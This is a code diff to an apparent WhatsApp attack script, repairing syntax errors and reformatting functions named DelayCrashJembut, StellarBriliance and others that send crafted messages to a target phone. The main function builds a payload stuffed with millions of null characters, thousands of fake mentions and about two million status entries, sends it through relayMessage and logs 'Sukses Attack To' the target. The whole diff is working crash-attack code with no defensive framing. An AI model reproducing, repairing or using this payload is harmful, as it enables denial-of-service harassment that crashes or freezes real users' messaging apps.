@@ -388,7 +388,7 @@ async function DileyHarddd(target) {
     {}
   )
 
-  await client..relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
+  await client.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
 
   await client.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
@@ -456,7 +456,7 @@ async function StellarBriliance(client, target, type = 'RAM') {
                 isForwarded: true,
                 remoteJid: "120363424874566521@newsletter",
                 forwardedNewsletterMessageInfo: {
-                    newsletterJid: "120363424874566521@newsletter,
+                    newsletterJid: "120363424874566521@newsletter",
                     serverMessageId: 1337,
                     newsletterName: "Renner¿? By Pinzy"
                 },
@@ -480,44 +480,49 @@ async function StellarBriliance(client, target, type = 'RAM') {
 
 async function DelayCrashJembut(target) {
  try {
+
   const Xylent = {
    requestPhoneNumberMessage: {
     body: {
-                text: "\u0000".repeat(2000000),
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "request_phone_number",
-                paramsJson: `{"phone_number":"${"\u0000".repeat(3000000)}","country_code":"${"\u0000".repeat(500000)}","otp":"${"\u0000".repeat(1000000)}","validation":"${"\u0000".repeat(800000)}"}`,
-                version: 3
-              },
-              contextInfo: {
-                ephemeralExpiration: 0,
-                forwardingScore: 999999999,
-                isForwarded: true,
-                font: Math.floor(Math.random() * 99999999),
-                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
-                mentionedJid: Array.from({ length: 8000 }, () => 
-                  Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-                ),
-                statusAttributionType: 2,
-                statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
-                  type: 1
-                }))
-              }
-            }
-          }
-        }
-        
-    await client.relayMessage(target, Xylent, {
-      participant: { jid: target }
-    });
-    
-    console.log(`✅ Xylent Sukses Attack To: ${target}`);
-    
-  } catch (err) {
-    console.error(`❌ Error: ${err.message}`);
-  }
+      text: "\u0000".repeat(2000000),
+      format: "DEFAULT"
+    },
+
+    nativeFlowResponseMessage: {
+      name: "request_phone_number",
+      paramsJson: `{"phone_number":"${"\u0000".repeat(3000000)}","country_code":"${"\u0000".repeat(500000)}","otp":"${"\u0000".repeat(1000000)}","validation":"${"\u0000".repeat(800000)}"}`,
+      version: 3
+    },
+
+    contextInfo: {
+      ephemeralExpiration: 0,
+      forwardingScore: 999999999,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+      mentionedJid: Array.from({ length: 8000 }, () => 
+        Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
+      ),
+      statusAttributionType: 2,
+      statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
+        type: 1
+      }))
+    }
+
+   }
+  };
+
+  await client.relayMessage(target, Xylent, {
+    participant: { jid: target }
+  });
+
+  console.log(`✅ Xylent Sukses Attack To: ${target}`);
+
+ } catch (err) {
+
+  console.error(`❌ Error: ${err.message}`);
+
+ }
 }
 
 async function Killers(target) {
